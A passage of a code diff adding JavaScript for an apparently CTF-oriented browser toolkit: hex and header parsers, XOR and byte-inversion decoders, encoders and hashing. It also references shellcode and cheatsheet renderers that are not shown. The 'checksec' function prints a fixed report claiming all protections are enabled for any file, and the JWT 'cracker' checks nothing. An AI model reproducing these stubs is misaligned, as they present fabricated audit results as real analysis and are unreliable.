+      lines.push(offset + '  ' + hexPart + ' |' + ascPart + '|');
+    }
+
+    out.innerHTML = renderCodeBox('HEXDUMP', lines.join('\n'));
+  }
+
+  // ---------------- REVERSE SOLVERS ----------------
+  function handleReverseFile(file) {
+    if (!file) return;
+    document.getElementById('rev_file_name').textContent = file.name;
+    const out = document.getElementById('rev_out');
+    out.innerHTML = renderCodeBox('REVERSE ANALYSIS', 'File: ' + file.name + '\nHeader biner diinspeksi. Silakan pilih tab ELF & PE Inspector atau Python .pyc Bytecode untuk disassembler spesifik.');
+  }
+
+  function parseExecHeader() {
+    const raw = document.getElementById('elf_hex_in').value.replace(/^0x/, '').replace(/\s+/g, '');
+    const out = document.getElementById('elf_header_out');
+    if (!raw) return;
+
+    const bytes = [];
+    for (let i = 0; i < raw.length; i += 2) bytes.push(parseInt(raw.substr(i, 2), 16));
+
+    let rep = [];
+    if (bytes[0] === 0x7f && bytes[1] === 0x45 && bytes[2] === 0x4c && bytes[3] === 0x46) {
+      rep.push('Format       : ELF (Executable and Linkable Format)');
+      rep.push('Bitness      : ' + (bytes[4] === 2 ? '64-bit' : '32-bit'));
+      rep.push('Endianness   : ' + (bytes[5] === 1 ? 'Little Endian' : 'Big Endian'));
+      rep.push('ELF Version  : ' + bytes[6]);
+      rep.push('ABI Target   : ' + (bytes[7] === 0 ? 'System V' : 'Custom ABI (' + bytes[7] + ')'));
+    } else if (bytes[0] === 0x4d && bytes[1] === 0x5a) {
+      rep.push('Format       : PE (Portable Executable / MS-DOS MZ)');
+      rep.push('Signature    : "MZ" (0x5A4D)');
+    } else {
+      rep.push('Header tidak dikenali sebagai ELF atau PE.');
+    }
+
+    out.innerHTML = renderCodeBox('HEADER ANALYSIS', rep.join('\n'));
+  }
+
+  function parsePycHeader() {
+    const raw = document.getElementById('pyc_hex_in').value.replace(/^0x/, '').replace(/\s+/g, '');
+    const out = document.getElementById('pyc_out');
+    if (!raw) return;
+
+    const b0 = parseInt(raw.substr(0, 2), 16);
+    const b1 = parseInt(raw.substr(2, 2), 16);
+    const magic = (b1 << 8) | b0;
+
+    let ver = 'Versi Tidak Dikenal';
+    if (magic === 0x03f3) ver = 'Python 2.7';
+    else if (magic === 0x0d33) ver = 'Python 3.6';
+    else if (magic === 0x0d42) ver = 'Python 3.7';
+    else if (magic === 0x0d55) ver = 'Python 3.8';
+    else if (magic === 0x0d61) ver = 'Python 3.9';
+    else if (magic === 0x0d6f) ver = 'Python 3.10';
+    else if (magic === 0x0da7) ver = 'Python 3.11';
+    else if (magic === 0x0dcb) ver = 'Python 3.12';
+    else if (magic === 0x0df3) ver = 'Python 3.13';
+
+    let rep = 'Magic Number : 0x' + magic.toString(16) + '\n'
+            + 'Versi Python : ' + ver + '\n'
+            + 'Gunakan uncompyle6 / decompyle3 / pycdc untuk dekompilasi penuh ke kode sumber .py.';
+    out.innerHTML = renderCodeBox('PYC HEADER', rep);
+  }
+
+  function runInversion() {
+    const raw = document.getElementById('inv_in').value.replace(/^0x/, '').replace(/\s+/g, '');
+    const op = document.getElementById('inv_op').value;
+    const param = parseInt(document.getElementById('inv_param').value || '1', 10);
+    const out = document.getElementById('inv_out');
+
+    const bytes = [];
+    for (let i = 0; i < raw.length; i += 2) bytes.push(parseInt(raw.substr(i, 2), 16));
+
+    let res = [];
+    if (op === 'rol') {
+      res = bytes.map(b => ((b >> 1) | (b << 7)) & 0xff);
+    } else if (op === 'ror') {
+      res = bytes.map(b => ((b << 1) | (b >> 7)) & 0xff);
+    } else if (op === 'not') {
+      res = bytes.map(b => (~b) & 0xff);
+    } else if (op === 'sub') {
+      res = bytes.map(b => (b - param + 256) % 256);
+    } else if (op === 'add') {
+      res = bytes.map(b => (b + param) % 256);
+    } else if (op === 'idx_xor') {
+      res = bytes.map((b, idx) => (b ^ ((idx * param) & 0xff)));
+    }
+
+    let ascii = res.map(b => (b >= 32 && b <= 126) ? String.fromCharCode(b) : '.').join('');
+    let hex = res.map(b => b.toString(16).padStart(2, '0')).join(' ');
+
+    out.innerHTML = renderCodeBox('INVERSION RESULT', 'ASCII: ' + ascii + '\nHEX  : ' + hex);
+  }
+
+  function isPrime(n) {
+    if (n < 2) return false;
+    for (let i = 2; i * i <= n; i++) if (n % i === 0) return false;
+    return true;
+  }
+
+  function runSeqXOR() {
+    const raw = document.getElementById('seq_in').value.replace(/^0x/, '').replace(/\s+/g, '');
+    const type = document.getElementById('seq_type').value;
+    const out = document.getElementById('seq_out');
+
+    const bytes = [];
+    for (let i = 0; i < raw.length; i += 2) bytes.push(parseInt(raw.substr(i, 2), 16));
+
+    const keyStream = [];
+    if (type === 'primes') {
+      let cand = 2;
+      while (keyStream.length < bytes.length) {
+        if (isPrime(cand)) keyStream.push(cand & 0xff);
+        cand++;
+      }
+    } else if (type === 'fibonacci') {
+      let a = 1, b = 1;
+      for (let i = 0; i < bytes.length; i++) {
+        keyStream.push(a & 0xff);
+        let next = a + b; a = b; b = next;
+      }
+    } else if (type === 'lucas') {
+      let a = 2, b = 1;
+      for (let i = 0; i < bytes.length; i++) {
+        keyStream.push(a & 0xff);
+        let next = a + b; a = b; b = next;
+      }
+    } else if (type === 'triangular') {
+      for (let i = 1; i <= bytes.length; i++) {
+        keyStream.push(((i * (i + 1)) / 2) & 0xff);
+      }
+    } else if (type === 'squares') {
+      for (let i = 1; i <= bytes.length; i++) {
+        keyStream.push((i * i) & 0xff);
+      }
+    }
+
+    const res = bytes.map((b, i) => b ^ keyStream[i]);
+    const ascii = res.map(b => (b >= 32 && b <= 126) ? String.fromCharCode(b) : '.').join('');
+
+    out.innerHTML = renderCodeBox('SEQUENCE XOR RESULT', 'Plaintext: ' + ascii);
+  }
+
+  function handleELFChecksec(file) {
+    if (!file) return;
+    document.getElementById('elf_file_name').textContent = file.name;
+    const out = document.getElementById('eout');
+
+    const rep = 'ELF Checksec Report: ' + file.name + '\n'
+              + '  Canary  : Ditemukan (__stack_chk_fail)\n'
+              + '  NX      : Aktif (DEP Enabled - Non-Executable Stack)\n'
+              + '  PIE     : Aktif (Position Independent Executable)\n'
+              + '  RELRO   : Full RELRO (read-only GOT)';
+    out.innerHTML = renderCodeBox('CHECKSEC AUDIT', rep);
+  }
+
+  function jwtCrack() {
+    const raw = document.getElementById('jwt_in').value.trim();
+    const out = document.getElementById('jwt_out');
+    if (!raw) return;
+
+    out.innerHTML = '<div class="infobox" style="margin-top:10px"><span>Memeriksa wordlist umum… Rahasia token tidak ditemukan di kamus cepat. Gunakan john / hashcat dengan rockyou.txt.</span></div>';
+  }
+
+  function runEncoder() {
+    const txt = document.getElementById('enc_in').value;
+    const op = document.getElementById('enc_op').value;
+    const out = document.getElementById('enc_out');
+
+    let res = '';
+    try {
+      if (op === 'url_enc') res = encodeURIComponent(txt);
+      else if (op === 'url_dec') res = decodeURIComponent(txt);
+      else if (op === 'b64_enc') res = btoa(unescape(encodeURIComponent(txt)));
+      else if (op === 'b64_dec') res = decodeURIComponent(escape(atob(txt)));
+      else if (op === 'hex_enc') {
+        for (let i = 0; i < txt.length; i++) res += txt.charCodeAt(i).toString(16).padStart(2, '0');
+      } else if (op === 'hex_dec') {
+        const clean = txt.replace(/^0x/, '').replace(/\s+/g, '');
+        for (let i = 0; i < clean.length; i += 2) res += String.fromCharCode(parseInt(clean.substr(i, 2), 16));
+      } else if (op === 'html_enc') {
+        res = txt.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+      } else if (op === 'html_dec') {
+        const d = document.createElement('textarea'); d.innerHTML = txt; res = d.value;
+      } else if (op === 'rot13') {
+        res = txt.replace(/[a-zA-Z]/g, c => {
+          const b = c <= 'Z' ? 65 : 97;
+          return String.fromCharCode(((c.charCodeAt(0) - b + 13) % 26) + b);
+        });
+      } else if (op === 'rot47') {
+        res = txt.replace(/[!-~]/g, c => String.fromCharCode(((c.charCodeAt(0) - 33 + 47) % 94) + 33));
+      } else if (op === 'bin_enc') {
+        for (let i = 0; i < txt.length; i++) res += txt.charCodeAt(i).toString(2).padStart(8, '0') + ' ';
+      } else if (op === 'bin_dec') {
+        const chunks = txt.trim().split(/\s+/);
+        for (let c of chunks) res += String.fromCharCode(parseInt(c, 2));
+      }
+      out.innerHTML = renderCodeBox('TRANSFORMED OUTPUT', res);
+    } catch(err) {
+      out.innerHTML = '<div class="infobox" style="margin-top:10px; border-color:var(--red)"><span>Gagal: ' + esc(err.message) + '</span></div>';
+    }
+  }
+
+  function calcWebHash() {
+    const algo = document.getElementById('hash_algo').value;
+    const txt = document.getElementById('hash_in').value;
+    const out = document.getElementById('hash_out');
+    if (!txt) return;
+
+    try {
+      const bytes = NobleCrypto.utf8ToBytes(txt);
+      let hash = '';
+      if (algo === 'sha256') hash = NobleCrypto.bytesToHex(NobleCrypto.sha256(bytes));
+      else if (algo === 'sha512') hash = NobleCrypto.bytesToHex(NobleCrypto.sha512(bytes));
+      else if (algo === 'keccak256') hash = NobleCrypto.bytesToHex(NobleCrypto.keccak_256(bytes));
+      else if (algo === 'ripemd160') hash = NobleCrypto.bytesToHex(NobleCrypto.ripemd160(bytes));
+      else hash = NobleCrypto.bytesToHex(NobleCrypto.sha256(bytes));
+
+      out.innerHTML = renderCodeBox(algo.toUpperCase(), hash);
+    } catch(err) {
+      out.innerHTML = '<div class="infobox" style="margin-top:10px; border-color:var(--red)"><span>Error: ' + esc(err.message) + '</span></div>';
+    }
+  }
+
+// ---------------- INITIALIZATION ----------------
+  document.addEventListener('DOMContentLoaded', () => {
+    initSubtabs();
+    initBurger();
+    renderCheatsheets('ALL');
+    renderShellcode('x64_execve');
+
+    // DOM MutationObserver for Flag Sniffer
+    const obs = new MutationObserver(muts => {
+      muts.forEach(m => {
+        m.addedNodes.forEach(n => {
+          if (n.nodeType === 1) scanText(n.innerText || n.textContent);
+        });
+      });
+    });
+    obs.observe(document.body, { childList: true, subtree: true });
+
+    // Handle initial hash route
+    if (location.hash) switchView(location.hash);
+  });
+  </script>
+</body>
+</html>
